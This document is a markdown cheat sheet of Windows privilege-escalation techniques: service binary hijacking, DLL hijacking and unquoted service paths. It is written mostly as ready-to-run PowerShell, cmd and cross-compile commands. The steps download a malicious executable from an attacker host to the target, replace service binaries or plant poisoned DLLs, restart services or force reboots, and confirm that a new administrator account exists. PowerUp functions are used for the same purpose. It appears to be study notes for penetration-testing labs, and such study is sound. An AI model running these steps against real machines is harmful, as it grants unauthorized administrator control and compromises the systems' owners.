# Leveraging Windows services

## Service Binary Hijacking

__REQUIRES__

 - A service running via a binary you have permissions over
 - Said service to be running as a more privileged user
 - Either SeShutdownPrivilege or permissions to restart the service

Find running services (This will not work in WinRM, use another protocol)
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Identify permissions over binary - (RX) not sufficient, (F) is ideal, (I) means inherited
```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
```

cross-compile code (code in resources)
```bash
x86_64-w64-mingw32-gcc ausr.c -o ausr.exe
```

move to target machine
```powershell
iwr -uri http://$ip/ausr.exe -Outfile httpd.exe
```

restart service
```powershell
net stop httpd
net start httpd
```

if no permissions (SeShutdownPrivilege required)
```powershell
whoami /priv
shutdown /r /t 0
```

check work
```powershell
Get-LocalGroupMember administrators
```

Using powerup

import
```powershell
. .\PowerUp.ps1
```

Use
```powershell
Get-ModifiableServiceFile
Install-ServiceBinary -Name 'mysql'
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' | Get-ModifiablePath -Literal
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -conf=C:\test\path' | Get-ModifiablePath -Literal
```

## DLL Hijacking

__REQUIRES__

 - Binary/DLL combo that is vulnerable to exploit
 - Write permissions over the directory containing the exe

Enumerate installed software (search for DLL Hijacking vulnerabilites for the software online)
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Get file permissions
```powershell
icacls "C:\software\name\"
```

Check .exe with procmon
```text
https://learn.microsoft.com/en-us/sysinternals/
```

procmon filters (confirm our dll is vulnerable)
```text
Process Name is $exe
Operation is CreateFile
Path contains $dll
```

Should look like
```text
CreateFile $directory_containing_exe
CreateFile $Alternative_System_Directory
```

Cross-Compile poisoned dll (code in resources)
```bash
x86_64-w64-mingw32-gcc dllname.cpp --shared -o dllname.dll
```

Check results
```powershell
net user
net localgroup administrators
```


## Unquoted service paths

__REQUIRES__

 - Service with unquoted path and spaces
 - Write permissions over directory with space-breaks
 - Either SeShutdownPrivilege or permissions to restart the service

Enumerate services with PathName
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

This will find the unquoted service paths, but MUST be run in cmd (not pwsh)
```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Identify
```text
C:\Program Files\My Program\My service\service.exe
not
"C:\Program Files\My Program\My service\service.exe"
```

Determine directory access with space break
```powershell
icacls "C:\Program Files\Enterprise Apps\"
```

use adduser.exe
```powershell
if "C:\Program Files\Enterprise Apps\"
copy .\Enterprise.exe 'C:\Program Files\Enterprise.exe'
Start-Service $service

or

shutdown /r /t 0
```

check work
```powershell
net user
net localgroup administrators
```

Using powerup
```powershell
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name $service -Path $path
Restart-Service $service
```